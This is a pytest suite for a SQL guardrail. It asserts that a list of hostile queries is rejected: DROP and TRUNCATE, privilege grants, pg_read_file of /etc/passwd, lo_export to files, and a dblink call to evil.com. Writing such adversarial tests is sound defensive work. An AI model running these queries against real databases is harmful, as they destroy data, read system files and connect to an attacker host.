"""Adversarial security test suite for the SQLGlot AST guardrail."""

from __future__ import annotations

from pathlib import Path

import pytest

from app.guard import SQLGuardError, validate_and_normalize_sql

REPO_ROOT = Path(__file__).resolve().parents[1]


@pytest.mark.parametrize(
    "malicious_sql",
    [
        "",
        "   -- comment only",
        "SELECT 1; DROP TABLE users;",
        "SELECT 1;;",
        "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
        "WITH u AS (UPDATE users SET role = 'admin' RETURNING *) SELECT * FROM u",
        "WITH i AS (INSERT INTO users (name) VALUES ('eve') RETURNING *) SELECT * FROM i",
        "DELETE FROM users WHERE id = 1",
        "UPDATE users SET active = FALSE",
        "INSERT INTO users (name) VALUES ('eve')",
        "DROP TABLE users",
        "ALTER TABLE users ADD COLUMN pwn TEXT",
        "CREATE TABLE evil (id INT)",
        "GRANT ALL ON users TO public",
        "REVOKE ALL ON users FROM public",
        "COPY users TO '/tmp/leak.csv'",
        "TRUNCATE TABLE users",
        "SELECT * INTO evil_copy FROM users",
        "SELECT * FROM users FOR UPDATE",
        "EXPLAIN ANALYZE DELETE FROM users",
        "/* harmless comment */ DROP TABLE users",
        "SELECT /* inline */ pg_sleep(10)",
        "SELECT pg_catalog.pg_sleep(10)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('.')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(1234, '/tmp/out')",
        "SELECT dblink('host=evil.com', 'SELECT 1')",
        "SELECT pg_terminate_backend(1)",
        "SELECT * FROM users LIMIT 1001",
        "SELECT * FROM users LIMIT ALL",
        "SELECT * FROM (SELECT * FROM users LIMIT 5000) sub",
        "SELECT * FROM (;;;",
    ],
)
def test_guard_blocks_adversarial_queries(malicious_sql: str) -> None:
    with pytest.raises(SQLGuardError):
        validate_and_normalize_sql(malicious_sql)


def test_guard_allows_valid_queries_and_enforces_limit() -> None:
    sql_no_limit = "SELECT u.name, COUNT(o.id) AS cnt FROM users u JOIN orders o ON u.id = o.user_id GROUP BY u.name"
    normalized = validate_and_normalize_sql(sql_no_limit)
    assert "LIMIT 100" in normalized

    sql_with_limit = "SELECT id, name FROM users WHERE active = TRUE ORDER BY id LIMIT 25"
    assert "LIMIT 25" in validate_and_normalize_sql(sql_with_limit)

    cte_query = "WITH top_u AS (SELECT id, name FROM users WHERE score > 10) SELECT name FROM top_u"
    assert "LIMIT 100" in validate_and_normalize_sql(cte_query)

    union_query = "SELECT name FROM customers UNION SELECT name FROM vendors"
    assert "LIMIT 100" in validate_and_normalize_sql(union_query)


def test_guard_line_budget() -> None:
    lines = (REPO_ROOT / "app" / "guard.py").read_text(encoding="utf-8").splitlines()
    assert len(lines) < 200, f"app/guard.py exceeded 200-line limit: {len(lines)} lines"
